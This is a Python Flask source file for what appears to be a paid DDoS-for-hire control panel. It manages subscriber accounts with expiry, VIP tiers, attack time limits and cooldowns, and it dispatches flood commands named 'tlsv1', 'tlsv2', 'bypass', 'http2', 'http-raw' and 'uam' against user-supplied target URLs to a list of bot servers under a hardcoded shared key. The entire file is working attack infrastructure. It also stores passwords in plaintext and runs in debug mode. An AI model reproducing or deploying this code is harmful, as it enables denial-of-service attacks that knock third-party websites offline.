from flask import Flask, request, jsonify, render_template, Response
import json
import os
import string
import random
import requests
import time
from datetime import datetime, timedelta

app = Flask(__name__)
DATA_FILE = 'database.json'
SERVER_FILE = 'server.json'

def generate_random_key(length=12):
    characters = string.ascii_letters + string.digits
    gen_key = ''.join(random.choice(characters) for i in range(length))
    return gen_key

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as file:
            return json.load(file)
    return []

def create_key_file(user, key):
    key_file_path = f'key/{user}.txt'
    if os.path.exists(key_file_path):
        with open(key_file_path, 'r') as f:
            stored_key = f.read()
            if stored_key == key:
                return stored_key
            else:
                return None
    else:
        with open(key_file_path, 'w') as f:
            generated_key = generate_random_key(100)
            f.write(generated_key)
            return generated_key

def load_key(key_file):
    with open(f'key/{key_file}.txt', 'r') as f:
        key = f.read()
    return key

def save_data(data):
    with open(DATA_FILE, 'w') as file:
        json.dump(data, file, indent=4)

def load_server():
    if os.path.exists(SERVER_FILE):
        with open(SERVER_FILE, 'r') as file:
            return json.load(file)
    return []

def save_server(data):
    with open(SERVER_FILE, 'w') as file:
        json.dump(data, file, indent=4)

def request_attack(cmd, url, timel):
    servers = load_server()
    data = {'key': 'iehsi38gIe8egd928gsog', 'url': url, 'time': timel}
    for s in servers:
        response = requests.post(f"{s['server']}/api/attack/{cmd}", json=data)
        if response.status_code == 200:
            result = response.json().get('status')
            print(result)
        else:
            print("SERVER ERROR")


@app.route('/stream')
def stream():
    def event_stream():
        while True:
            yield 'data: {}\n\n'.format('Hello World')
            time.sleep(1)

    return Response(event_stream(), mimetype='text/event-stream')

def load_logo():
    with open("layout/logo.txt", "r") as f:
        logo = f.read()
    return logo

def layout_input():
    with open("layout/input.txt", "r") as f:
        logo = f.read()
    return logo

@app.route('/')
def home_page():
    return render_template('index.html')

@app.route('/api/users', methods=['GET'])
def get_users():
    users = load_data()
    return jsonify(users)

@app.route('/api/user/logo', methods=['GET'])
def get_logo():
    logo = load_logo()
    return jsonify({'message': logo})

@app.route('/api/user/layoutinput', methods=['GET'])
def get_input():
    layout_inp = layout_input()
    return jsonify({'message': layout_inp})

@app.route('/api/user/title/<username>', methods=['GET'])
def get_title(username):
    users = load_data()
    servers = load_server()
    online_users = [u['username'] for u in users if u['login']]
    total_online = len(online_users)
    total_users = len(users)
    total_server = len(servers)
    count_200 = 0
    for s in servers:
        server = s['server']
        response = requests.get(server)
        if response.status_code == 200:
            count_200 += 1
    ad = f"N S D | User : {username} | User online: {total_online}/{total_users} | Bots online: {count_200}/{total_server}"
    return jsonify({'message': ad})

@app.route('/api/user/<credentials>', methods=['GET'])
def get_login(credentials):
    try:
        username, password, key = credentials.split(':')
    except ValueError:
        return jsonify({'message': 'Invalid format. Use username:password:key'}), 400
    users = load_data()
    user = next((u for u in users if u['username'] == username and u['password'] == password), None)
    if not user:
        return jsonify({'message': 'Invalid username or password'}), 404
    expired_date = datetime.strptime(user['expired'], '%Y-%m-%d %H:%M:%S')
    if datetime.now() > expired_date:
        return jsonify({'message': 'Your account has expired'}), 403
    if user['banned']:
        return jsonify({'message': 'Your account has been banned'}), 403
    user_keygen = create_key_file(username, key)
    if not user_keygen:
        return jsonify({'message': 'Invalid login'}), 403
    user['login'] = True
    save_data(users)
    data = {'message': 'Login successful', 'key': user_keygen, 'user': user}
    return jsonify(data)

@app.route('/api/user/logout/<username>', methods=['GET'])
def get_logout(username):
    users = load_data()
    user = next((u for u in users if u['username'] == username), None)
    if not user:
        return jsonify({'message': 'Invalid username'}), 404
    user['login'] = False
    save_data(users)
    return jsonify({'message': 'You have successfully logged out'}), 200

@app.route('/api/user/command/<credentials>', methods=['POST'])
def execute_command(credentials):
    try:
        username, cmd, key = credentials.split(':')
    except ValueError:
        return jsonify({'message': 'Invalid format. Use username:command:key'}), 400
    users = load_data()
    cmd_data = request.json
    user = next((u for u in users if u['username'] == username), None)
    if not user:
        return jsonify({'message': 'Invalid username'}), 404
    if key != load_key(username):
        return jsonify({'message': 'Invalid key'}), 403
    # Check if user is banned or expired
    expired_date = datetime.strptime(user['expired'], '%Y-%m-%d %H:%M:%S')
    if datetime.now() > expired_date:
        return jsonify({'message': 'Your account has expired'}), 403
    if user['banned']:
        return jsonify({'message': 'Your account has been banned'}), 403
    if user['expired'] == '9999-12-31 00:00:00':
        days_expired_str = 'LifeTime:)'
    elif expired_date > datetime.now():
        days_expired = (expired_date - datetime.now())
        days_expired_str = str(days_expired)
    else:
        days_expired_str = 'Expired'
    if cmd == 'help':
        with open('layout/help.txt') as f:
            help_content = f.read()
        return jsonify({'message': help_content}), 200
    elif cmd == 'method':
        with open('layout/method.txt') as f:
            method_content = f.read()
        return jsonify({'message': method_content}), 200
    elif cmd == 'myinfo':
        with open('layout/myinfo.txt') as f:
            myinfo_content = f.read()
            myinfo_content = myinfo_content.format(
                username=user['username'],
                admin=user['admin'],
                vip=user['vip'],
                timelimit=user['timelimit'],
                cooldown=user['cooldown'],
                expired=days_expired_str,
                banned=user['banned']
            )
        return jsonify({'message': myinfo_content}), 200
    elif cmd == 'userinfo':
        if user['admin']:
            target_username = cmd_data.get('username')
            target_user = next((u for u in users if u['username'] == target_username), None)
            if target_user:
                expired_date = datetime.strptime(target_user['expired'], '%Y-%m-%d %H:%M:%S')
                if target_user['expired'] == '9999-12-31 00:00:00':
                    days_expired_str = 'LifeTime:)'
                elif expired_date > datetime.now():
                    days_expired = (expired_date - datetime.now())
                    days_expired_str = str(days_expired)
                else:
                    days_expired_str = 'Expired'
                with open('layout/myinfo.txt') as f:
                    userinfo_content = f.read()
                    userinfo_content = userinfo_content.format(
                        username=target_user['username'],
                        admin=target_user['admin'],
                        vip=target_user['vip'],
                        timelimit=target_user['timelimit'],
                        cooldown=target_user['cooldown'],
                        expired=days_expired_str,
                        banned=target_user['banned']
                    )
                return jsonify({'message': userinfo_content}), 200
            else:
                return jsonify({'message': 'Username not found'}), 404
        else:
            return jsonify({'message': 'Permission denied'}), 403
    elif cmd == 'banned':
        if user['admin']:
            target_username = cmd_data.get('username')
            target_user = next((u for u in users if u['username'] == target_username), None)
            if target_user:
                target_user['banned'] = True
                save_data(users)
                return jsonify({'message': f'{target_user["username"]} has been banned'}), 200
            else:
                return jsonify({'message': 'Username not found'}), 404
        else:
            return jsonify({'message': 'Permission denied'}), 403
    elif cmd == 'un-banned':
        if user['admin']:
            target_username = cmd_data.get('username')
            target_user = next((u for u in users if u['username'] == target_username), None)
            if target_user:
                target_user['banned'] = False
                save_data(users)
                return jsonify({'message': f'{target_user["username"]} has been unbanned'}), 200
            else:
                return jsonify({'message': 'Username not found'}), 404
        else:
            return jsonify({'message': 'Permission denied'}), 403
    elif cmd == 'adduser':
        if user['admin']:
            username = cmd_data.get('username')
            for u in users:
                if u['username'] == username:
                    return jsonify({'message': 'Username already exists'}), 400
            password = cmd_data.get('password')
            admin = False
            vip = cmd_data.get('vip')
            if vip == "false":
                vip = False
            elif vip == "true":
                vip = True
            timelimit = int(cmd_data.get('timelimit'))
            cooldown = int(cmd_data.get('cooldown'))
            expired = cmd_data.get('expired')
            banned = False
            login = False
            new_user = {
                'username': username,
                'password': password,
                'admin': admin,
                'vip': vip,
                'timelimit': timelimit,
                'cooldown': cooldown,
                'expired': expired,
                'banned': banned,
                'login': login
            }
            users.append(new_user)
            save_data(users)
            return jsonify({'message': f'{username} Has been successfully added'}), 200
        else:
            return jsonify({'message': 'Permission denied'}), 403
    elif cmd == 'delete':
        if user['admin']:
            target_username = cmd_data.get('username')
            target_user = next((u for u in users if u['username'] == target_username), None)
            if target_user:
                users.remove(target_user)
                save_data(users)
                return jsonify({'message': f'{target_username} has been successfully deleted'}), 200
            else:
                return jsonify({'message': 'Username not found'}), 404
        else:
            return jsonify({'message': 'Permission denied'}), 403
    elif cmd == 'password':
        target_password = cmd_data.get('password')
        target_user = next((u for u in users if u['username'] == username), None)
        if target_user:
            target_user['password'] = target_password
            save_data(users)
            return jsonify({'message': 'Password changed successfully'}), 200
        else:
            return jsonify({'message': 'User not found'}), 404
    elif cmd == 'online':
        if user['admin']:
            online_users = [u['username'] for u in users if u['login']]
            total_online = len(online_users)
            if total_online > 0:
                online_usernames_sorted = sorted(online_users)
                online_usernames_str = "\n".join(online_usernames_sorted)
                return jsonify({'message': f'Total online users: {total_online}\n{online_usernames_str}'}), 200
            else:
                return jsonify({'message': 'No users are currently online'}), 200
        else:
            return jsonify({'message': 'Permission denied'}), 403
    elif cmd == 'addserver':
        if user['admin']:
            servers = load_server()
            new_server = cmd_data.get('server')
            for s in servers:
                if s['server'] == new_server:
                    return jsonify({'message': 'Server already exists'}), 400
            servers.append({'server': new_server})
            save_server(servers)
            return jsonify({'message': f'{new_server} has been successfully added'}), 200
        else:
            return jsonify({'message': 'Permission denied'}), 403
    elif cmd == 'rules':
        with open('layout/rules.txt') as f:
            rules_content = f.read()
            return jsonify({'message': rules_content})
    elif cmd == 'tlsv1':
        url = cmd_data.get('target')
        timel = int(cmd_data.get('time'))
        if timel <= user['timelimit']:
            last_attack_time = user.get('last_attack_time', 0)
            cooldown_duration = user.get('cooldown', 0)
            time_since_last_attack = time.time() - last_attack_time
            if time_since_last_attack >= cooldown_duration:
                request_attack(cmd, url, timel)
                user['last_attack_time'] = time.time()
                save_data(users)
                with open('layout/attack.txt') as f:
                    attack_content = f.read()
                    attack_content = attack_content.format(username=user['username'], vip=user['vip'], method=cmd, url=url, timel=timel)
                return jsonify({'message': attack_content}), 200
            else:
                remaining_cooldown = cooldown_duration - time_since_last_attack
                return jsonify({'message': f'Wait for {remaining_cooldown:.1f}s'}), 400
        else:
            return jsonify({'message': f'Your timelimit is {user["timelimit"]}s'}), 400
    elif cmd == 'tlsv2':
        url = cmd_data.get('target')
        timel = int(cmd_data.get('time'))
        if timel <= user['timelimit']:
            last_attack_time = user.get('last_attack_time', 0)
            cooldown_duration = user.get('cooldown', 0)
            time_since_last_attack = time.time() - last_attack_time
            if time_since_last_attack >= cooldown_duration:
                request_attack(cmd, url, timel)
                user['last_attack_time'] = time.time()
                save_data(users)
                with open('layout/attack.txt') as f:
                    attack_content = f.read()
                    attack_content = attack_content.format(username=user['username'], vip=user['vip'], method=cmd, url=url, timel=timel)
                return jsonify({'message': attack_content}), 200
            else:
                remaining_cooldown = cooldown_duration - time_since_last_attack
                return jsonify({'message': f'Wait for {remaining_cooldown:.1f}s'}), 400
        else:
            return jsonify({'message': f'Your timelimit is {user["timelimit"]}s'}), 400
    elif cmd == 'bypass':
        url = cmd_data.get('target')
        timel = int(cmd_data.get('time'))
        if timel <= user['timelimit']:
            last_attack_time = user.get('last_attack_time', 0)
            cooldown_duration = user.get('cooldown', 0)
            time_since_last_attack = time.time() - last_attack_time
            if time_since_last_attack >= cooldown_duration:
                request_attack(cmd, url, timel)
                user['last_attack_time'] = time.time()
                save_data(users)
                with open('layout/attack.txt') as f:
                    attack_content = f.read()
                    attack_content = attack_content.format(username=user['username'], vip=user['vip'], method=cmd, url=url, timel=timel)
                return jsonify({'message': attack_content}), 200
            else:
                remaining_cooldown = cooldown_duration - time_since_last_attack
                return jsonify({'message': f'Wait for {remaining_cooldown:.1f}s'}), 400
        else:
            return jsonify({'message': f'Your timelimit is {user["timelimit"]}s'}), 400
    elif cmd == 'http2':
        if user['vip']:
            url = cmd_data.get('target')
            timel = int(cmd_data.get('time'))
            if timel <= user['timelimit']:
                last_attack_time = user.get('last_attack_time', 0)
                cooldown_duration = user.get('cooldown', 0)
                time_since_last_attack = time.time() - last_attack_time
                if time_since_last_attack >= cooldown_duration:
                    request_attack(cmd, url, timel)
                    user['last_attack_time'] = time.time()
                    save_data(users)
                    with open('layout/attack.txt') as f:
                        attack_content = f.read()
                        attack_content = attack_content.format(username=user['username'], vip=user['vip'], method=cmd, url=url, timel=timel)
                    return jsonify({'message': attack_content}), 200
                else:
                    remaining_cooldown = cooldown_duration - time_since_last_attack
                    return jsonify({'message': f'Wait for {remaining_cooldown:.1f}s'}), 400
            else:
                return jsonify({'message': f'Your timelimit is {user["timelimit"]}s'}), 400
        else:
            return jsonify({'message': 'You are not a VIP user'}), 400
    elif cmd == 'http-raw':
        if user['vip']:
            url = cmd_data.get('target')
            timel = int(cmd_data.get('time'))
            if timel <= user['timelimit']:
                last_attack_time = user.get('last_attack_time', 0)
                cooldown_duration = user.get('cooldown', 0)
                time_since_last_attack = time.time() - last_attack_time
                if time_since_last_attack >= cooldown_duration:
                    request_attack(cmd, url, timel)
                    user['last_attack_time'] = time.time()
                    save_data(users)
                    with open('layout/attack.txt') as f:
                        attack_content = f.read()
                        attack_content = attack_content.format(username=user['username'], vip=user['vip'], method=cmd, url=url, timel=timel)
                    return jsonify({'message': attack_content}), 200
                else:
                    remaining_cooldown = cooldown_duration - time_since_last_attack
                    return jsonify({'message': f'Wait for {remaining_cooldown:.1f}s'}), 400
            else:
                return jsonify({'message': f'Your timelimit is {user["timelimit"]}s'}), 400
        else:
            return jsonify({'message': 'You are not a VIP user'}), 400
    elif cmd == 'uam':
        if user['vip']:
            url = cmd_data.get('target')
            timel = int(cmd_data.get('time'))
            if timel <= user['timelimit']:
                last_attack_time = user.get('last_attack_time', 0)
                cooldown_duration = user.get('cooldown', 0)
                time_since_last_attack = time.time() - last_attack_time
                if time_since_last_attack >= cooldown_duration:
                    request_attack(cmd, url, timel)
                    user['last_attack_time'] = time.time()
                    save_data(users)
                    with open('layout/attack.txt') as f:
                        attack_content = f.read()
                        attack_content = attack_content.format(username=user['username'], vip=user['vip'], method=cmd, url=url, timel=timel)
                    return jsonify({'message': attack_content}), 200
                else:
                    remaining_cooldown = cooldown_duration - time_since_last_attack
                    return jsonify({'message': f'Wait for {remaining_cooldown:.1f}s'}), 400
            else:
                return jsonify({'message': f'Your timelimit is {user["timelimit"]}s'}), 400
        else:
            return jsonify({'message': 'You are not a VIP user'}), 400
    else:
        return jsonify({'message': 'Command not found'}), 404

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8999, debug=True)